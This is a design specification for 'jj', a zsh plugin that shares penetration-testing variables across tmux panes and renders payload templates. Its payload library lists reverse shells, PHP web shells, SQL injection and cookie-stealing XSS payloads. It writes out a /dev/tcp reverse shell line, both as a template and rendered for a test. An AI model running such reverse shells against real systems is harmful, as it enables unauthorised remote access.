---
tags:
aliases:
document_type: spec
field:
description: jj zsh plugin specification
---

# jj Spec

`jj` is a zsh plugin for tmux-scoped workflow variables and payload rendering.

The plugin is designed for tmux-heavy terminal workflows where multiple panes
need to share target values, render payload templates, and copy the rendered
payload without stale shell state.

## Product Goals

`jj` manages five concerns:

```text
1. tmux session-scoped variables
2. current pane variable loading
3. payload template selection
4. payload rendering
5. clipboard or tmux-buffer copy
```

The primary constraints:

```text
- Values must be shared across panes in the same tmux session.
- Payload rendering must read fresh tmux session values every time.
- The current shell should only receive variables when explicitly loaded.
- Copy behavior must not break inside tmux or on payloads with special chars.
- The codebase should be plugin-first and split by responsibility layers.
- Kali deployment should work by installing the plugin directory.
- Bundled payloads should work without requiring users to export JJ_PAYLOAD_DIR.
```

## State Model

There are two separate variable states:

```text
tmux session environment = source of truth shared by all panes, internally JJ_ prefixed
current shell environment = local state for the current pane, without JJ_ prefix
```

Command behavior follows this model:

```text
jjs   writes internal JJ_ names to tmux and unprefixed names to current shell
jjl   loads tmux session values into current shell without JJ_ prefix
jjv   reads tmux session values and displays them without JJ_ prefix
jji   reads tmux session values, then loads selected values without JJ_ prefix
jjp   reads tmux session values directly while rendering
```

This distinction is required:

```text
echo $LHOST          needs jjl first in that pane
jjp render payload   does not need jjl; it reads tmux directly
```

## Public Interface

### Dispatcher

```text
jj COMMAND [ARGS]
```

Dispatches to command implementations:

```text
jj set
jj load
jj interactive
jj variable
jj payload
jj unset
jj help
```

### Wrappers

```zsh
jjs() { jj set "$@" }
jjl() { jj load "$@" }
jji() { jj interactive "$@" }
jjv() { jj variable "$@" }
jjp() { jj payload "$@" }
jjh() { jj help "$@" }
```

Final naming decision:

```text
jjs = jj set
jjl = jj load
jji = jj interactive
jjv = jj variable
jjp = jj payload
jjh = jj help
```

`jjp` is payload-only. Variable listing belongs to `jjv`.

## Command Specs

### `jj set NAME VALUE`

Wrapper:

```text
jjs NAME VALUE
```

With no arguments:

```text
jjs
```

opens a TUI for common variables:

```text
DOMAIN
LHOST
RHOST
LPORT
RPORT
```

Behavior:

```text
1. Normalize NAME into JJ_NAME.
2. Validate the normalized variable name.
3. Store JJ_NAME=VALUE in the current tmux session environment.
4. Export NAME=VALUE into the current shell.
5. Print NAME=VALUE without the internal JJ_ prefix.
```

Example:

```zsh
jjs LHOST 192.168.45.192
jjs LPORT 443
jjs RHOST 192.168.201.175
jjs RPORT 80
```

Stored values:

```text
JJ_LHOST=192.168.45.192
JJ_LPORT=443
JJ_RHOST=192.168.201.175
JJ_RPORT=80
```

User-facing shell values:

```text
LHOST=192.168.45.192
LPORT=443
RHOST=192.168.201.175
RPORT=80
```

### `jj load`

Wrapper:

```text
jjl
```

Behavior:

```text
1. Read all JJ_ variables from the current tmux session.
2. Validate each variable name before export.
3. Export each variable into the current shell without the JJ_ prefix.
4. Print the number of loaded variables.
```

Purpose:

```text
Synchronize an existing pane after another pane has changed tmux session values.
```

Example:

```zsh
jjl
echo $LHOST
```

### `jj interactive`

Wrapper:

```text
jji
```

Behavior:

```text
1. Read all JJ_ variables from tmux.
2. Present them in fzf.
3. Support fuzzy search.
4. Support Tab multi-select.
5. Export selected variables into the current shell without the JJ_ prefix.
6. Print the number of loaded variables.
```

This command is a variable loading layer, not a payload layer.

### `jj variable [PATTERN]`

Wrapper:

```text
jjv [PATTERN]
```

Behavior:

```text
1. Read all JJ_ variables from tmux.
2. If PATTERN is omitted, print all variables without the JJ_ prefix.
3. If PATTERN is host, print configured host variables as name/value lines.
4. If PATTERN is cred, print configured credential variables as name/value lines.
5. Otherwise filter by variable name only.
6. Do not open fzf.
7. Do not filter values.
```

Examples:

```zsh
jjv
jjv host
jjv cred
jjv port
jjv domain
```

Expected host view:

```text
LHOST
192.168.45.192
RHOST
192.168.201.175
LPORT
443
RPORT
80
```

Expected credential view:

```text
USER1
alice
PASSWD1
secret
HASH1
...
```

Only configured credential variables are printed. Supported names:

```text
USER
PASSWD
HASH
USER1
PASSWD1
HASH1
USER2
PASSWD2
HASH2
...
```

Expected fallback filtering:

```text
jjv port   matches LPORT and RPORT
jjv 443    does not match LPORT=443 unless the variable name contains 443
```

### `jj payload [CATEGORY]`

Wrapper:

```text
jjp [CATEGORY]
```

Behavior:

```text
1. Resolve the payload library directory.
2. Scan payload files and display path-style entries.
3. Apply optional category filtering.
4. Let fzf handle fuzzy search and selection.
5. Resolve the selected entry to a payload file.
6. Render the template with fresh tmux JJ_ values.
7. Copy the rendered payload.
8. Print the rendered payload.
9. Print variables used by the selected payload.
```

Categories:

```text
all      all payloads
shell    shell/*
linux    */linux/*
windows  */windows/*
sqli     sqli/*
xss      xss/*
```

First implementation supports argument-based category filtering:

```zsh
jjp
jjp shell
jjp linux
jjp windows
jjp sqli
jjp xss
```

Future interactive switch support may use fzf keybinds:

```text
ctrl-a  switch to all
ctrl-s  switch to shell
ctrl-l  switch to linux
ctrl-w  switch to windows
ctrl-q  quit
```

### `jj unset NAME [...]`

Behavior:

```text
1. Normalize each NAME into JJ_NAME.
2. Remove the variable from the current tmux session.
3. Unset the variable in the current shell.
4. Print each unset variable.
```

### `jj help [COMMAND]`

Behavior:

```text
1. Without COMMAND, print the top-level command summary.
2. With COMMAND, route to that command's own --help implementation.
```

Each command owns its help text so new behavior is documented near the command.

## Payload Library

Default path:

```text
~/.config/jj/payloads/
```

Recommended layout:

```text
payloads/
  shell/
    linux/
      bash-tcp
      sh-tcp
      nc-mkfifo
    windows/
      powershell-iwr
      powershell-rev
    web/
      php-system
      php-proc-open
  sqli/
    mysql/
    mssql/
  xss/
    basic-alert
    fetch-cookie
```

Selector display format:

```text
shell/linux/bash-tcp
shell/linux/sh-tcp
shell/linux/nc-mkfifo
shell/windows/powershell-rev
sqli/mysql/union-basic
xss/basic-alert
```

Payload templates are plain text files.

Preferred placeholder form:

```text
${JJ_LHOST}
${JJ_LPORT}
${JJ_DOMAIN}
```

Example:

```text
/bin/sh -i >/dev/tcp/${JJ_LHOST}/${JJ_LPORT} 2>&1 0>&1
```

## Payload Render Layer

Render must be isolated from current shell state.

Input:

```text
selected payload file
current tmux session JJ_ variables
```

Output:

```text
rendered payload string
used variable report
```

Required behavior:

```text
1. Read the selected payload file as plain text.
2. Read tmux session environment at render time.
3. Replace `${JJ_NAME}` placeholders with tmux values.
4. Support bare `JJ_NAME` replacement for compatibility.
5. Leave unknown placeholders unchanged.
6. Report only variables required by the template and present in tmux.
```

Important test case:

```text
pane1: jjs LHOST 10.10.10.10
pane1: jjs LPORT 9001
pane2: echo $LHOST
pane2: jjp linux
```

Expected:

```text
echo $LHOST prints empty output in pane2
jjp renders /bin/sh -i >/dev/tcp/10.10.10.10/9001 ...
```

## Fuzzy Search Layer

`fzf` is the selection UI for:

```text
jji = variable selection
jjp = payload selection
```

Responsibilities:

```text
jji:
  - Input: JJ_ variable lines from tmux.
  - UI: fzf with --multi.
  - Display: strip JJ_ prefix for operator readability.
  - Output: selected display NAME=VALUE lines mapped back to JJ_NAME=VALUE.
  - Next layer: safe export into current shell.

jjp:
  - Input: path-style payload entries.
  - UI: fzf selector.
  - Output: one selected payload path.
  - Next layer: payload render.
```

Non-interactive fzf testing uses:

```zsh
FZF_DEFAULT_OPTS='--filter=sh-tcp' jjp linux
```

When `fzf --filter` returns multiple matches, `jjp` should use the first
non-empty selected line. This keeps test mode deterministic and prevents
multi-line strings from being interpreted as one path.

## Variable Loading Layer

Variable loading must be separate from payload rendering.

Responsibilities:

```text
jj_var_normalize_name:
  - Strip leading "export ".
  - Strip anything after "=".
  - Uppercase the name.
  - Add JJ_ prefix when missing.
  - Validate against JJ_[A-Z_][A-Z0-9_]*.

jj_var_lines_from_tmux:
  - Read tmux show-environment.
  - Return only JJ_ assignments.

jj_export_var_line:
  - Validate NAME before export.
  - Export NAME=VALUE into current shell.

jj_var_display_lines_for_fzf:
  - Convert JJ_LHOST=... to LHOST=... for TUI display.
  - Do not change tmux storage format.

jj_var_line_from_display:
  - Convert selected LHOST=... back to JJ_LHOST=... before export.
```

Do not export arbitrary tmux environment lines.

## Copy Layer

Copy behavior is intentionally separated because payloads may contain spaces,
quotes, shell metacharacters, newlines, and other special characters.

Current strategy:

```text
1. If JJ_CLIP_BACKEND is set, use that named backend.
2. If JJ_CLIP_CMD is set, pipe rendered payload to that command.
3. Otherwise auto-detect clip.exe, wl-copy, xclip, xsel, pbcopy.
4. If no clipboard tool is found inside tmux, pipe to tmux load-buffer -.
```

Supported named backend:

```text
osc52
```

OSC52 is intended for SSH sessions where the remote Kali shell should copy text
to the local terminal clipboard. The payload is base64 encoded before being
wrapped in the OSC52 escape sequence. Inside tmux, the sequence is wrapped in
tmux passthrough escape framing.

Kali over SSH deployment should set:

```zsh
export JJ_CLIP_BACKEND=osc52
```

Do not require X server or Wayland clipboard packages for this workflow.

Preferred tmux behavior:

```text
print -rn -- "$rendered" | tmux load-buffer -
```

Reason:

```text
stdin-based copy avoids passing payload content as a tmux command argument.
This is safer for special characters and less likely to break inside tmux.
```

Open design topic:

```text
Should OSC52 be auto-detected in SSH sessions, or stay explicit through
JJ_CLIP_BACKEND=osc52?
```

Current decision: OSC52 is explicit so unsupported terminal/tmux combinations do
not print confusing escape artifacts.

## Plugin Architecture

`jj` is plugin-first.

Public entrypoint:

```text
jj.plugin.zsh
```

Plugin-level settings:

```text
JJ_PLUGIN_DIR   defaults to the plugin root directory
JJ_PAYLOAD_DIR  defaults to ${JJ_PLUGIN_DIR}/payloads unless already set
```

Users only need to set `JJ_PAYLOAD_DIR` when they want an external payload
library.

Layer files:

```text
lib/tmux.zsh        tmux and external command checks
lib/clipboard.zsh   copy backend detection and copy
lib/vars.zsh        variable commands and helpers
lib/payloads.zsh    payload list, fuzzy selection, render, reports
lib/help.zsh        help routing
lib/core.zsh        dispatcher and wrapper functions
```

Load order:

```text
1. tmux.zsh
2. clipboard.zsh
3. vars.zsh
4. payloads.zsh
5. help.zsh
6. core.zsh
```

## Implementation Status

Implemented:

```text
- plugin entrypoint: jj.plugin.zsh
- plugin-provided default JJ_PLUGIN_DIR and JJ_PAYLOAD_DIR
- layered lib/ structure
- jjs, jjl, jji, jjv, jjp, jjh wrappers
- tmux session variable source of truth
- argument-based payload filtering
- fzf payload and variable selection
- fresh tmux-based payload rendering
- deterministic non-interactive fzf filter behavior
- stdin-based tmux buffer fallback for copy
- explicit OSC52 backend for SSH/local-terminal clipboard copy
```

Not implemented yet:

```text
- fzf keybinds for in-TUI category switching
- formal automated test script
- strict warning for missing variables in payload templates
```
